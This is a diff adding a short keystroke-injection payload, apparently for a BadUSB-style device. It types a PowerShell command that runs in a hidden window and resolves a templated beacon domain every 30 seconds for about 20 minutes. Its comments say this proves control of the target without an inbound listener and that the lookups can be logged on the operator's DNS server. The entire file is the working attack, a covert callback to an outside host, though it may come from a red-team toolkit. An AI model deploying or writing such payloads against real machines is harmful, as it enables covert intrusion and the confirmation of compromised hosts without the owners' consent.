@@ -1,0 +1,6 @@
+REM DNS beacon - proves control without inbound listener
+REM Resolves {{BEACON_DOMAIN}} every 30s for ~20 minutes, hidden window
+REM Log the calls on your authoritative DNS server or use: tcpdump -i any port 53
+REM Tokens: {{BEACON_DOMAIN}}
+STRING powershell -NoProfile -WindowStyle Hidden -Command "$i=0;while($i -lt 40){Resolve-DnsName {{BEACON_DOMAIN}};Start-Sleep -Seconds 30;$i++}"
+ENTER
